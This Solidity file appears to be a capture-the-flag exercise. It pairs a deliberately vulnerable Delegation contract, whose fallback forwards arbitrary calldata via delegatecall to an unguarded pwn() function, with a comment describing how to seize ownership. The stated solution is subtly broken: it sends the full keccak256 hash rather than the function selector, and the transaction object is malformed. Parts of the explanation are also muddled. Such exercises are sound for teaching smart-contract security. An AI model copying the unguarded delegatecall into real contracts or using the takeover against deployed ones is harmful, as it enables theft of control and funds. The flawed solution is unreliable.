// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  // In order to send this function as data we need to hash it.
  function pwn() public {
    owner = msg.sender;
  }

}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  // Fallback and recieved function are functions who recieved data/funds
  // when sending transaction to unexists function.
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}



/* "NOTE"
    @dev In order to hack this smart contract I need 
    to call the function pwd(with hashing function) throught the delegation contract to make use of 
    the fallback function, that will send the data back to pwn function and get the onwership.
   @dev Why did I use the web3.utils.keccak256, because we will send data(e.g msg.data)
    to call the delegate contract to call pwd function. This data contains
    contains all the states variables and globals variabls are exists in delegations
    smart contrat. 
    Since "Delegation" contract is delegating the "Delegate contract",
    I can send msg.sender as well as msg.data to Delegate contract.
    Solution : 
    hashdata => let attack_pwned = web3.utils.keccak256("pwn()");
             => contract.sendTransaction({attack_pwned});
             => Boom
*/
